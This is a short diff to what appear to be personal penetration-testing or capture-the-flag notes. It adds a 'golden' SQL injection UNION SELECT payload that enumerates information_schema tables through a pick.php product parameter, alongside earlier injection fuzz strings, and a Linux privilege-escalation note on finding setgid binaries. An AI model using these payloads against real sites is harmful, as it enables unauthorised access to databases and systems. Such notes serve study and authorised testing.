@@ -92,7 +92,14 @@ Fuzzing the pages:
 
 	pick.php?product=7 OR 1=1 ;
  	products7 UNION SELECT 1,2,3
-  	
+
+   	<URL>/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.tables	# golden Statement
+
+
+Escalating Privs on Linux:
+
+	find binaries with guid bit set. 
+
 
 	
 
